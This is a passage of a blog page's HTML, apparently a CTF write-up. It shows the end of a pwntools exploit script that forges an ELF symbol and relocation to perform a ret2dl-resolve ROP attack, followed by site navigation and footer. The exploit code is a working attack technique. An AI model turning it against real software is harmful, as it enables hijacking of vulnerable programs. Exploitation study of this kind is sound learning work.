class="number">0xf</span></span><br><span class="line">                )  <span class="comment"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (</span><br><span class="line">    fake_sym_addr - dynsym) / <span class="number">0x10</span>  <span class="comment"># calculate the dynsym index of write</span></span><br><span class="line"><span class="comment">## plus 10 since the size of Elf32_Sym is 16.</span></span><br><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_write_sym = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">### making fake write relocation</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_write_reloc = flat([write_got, r_info])</span><br><span class="line"></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line"><span class="comment">## fake ret addr of write</span></span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(fake_write_reloc)  <span class="comment"># fake write reloc</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * align)  <span class="comment"># padding</span></span><br><span class="line">rop.raw(fake_write_sym)  <span class="comment"># fake write symbol</span></span><br><span class="line">rop.raw(<span class="string">'write\x00'</span>)  <span class="comment"># there must be a \x00 to mark the end of string</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line"></span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
  <div class="site-description" itemprop="description">Resit much,Obey little</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
        
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>

<div>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv" style='display:none'>
    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
    <span class="post-meta-divider">|</span>
</span>
<span id="busuanzi_container_site_uv" style='display:none'>
    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
</span>
</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/pisces.js?v=7.4.0"></script>

<script src="/js/next-boot.js?v=7.4.0"></script>



  








  <script src="/js/local-search.js?v=7.4.0"></script>














  

  

  

</body>
</html>
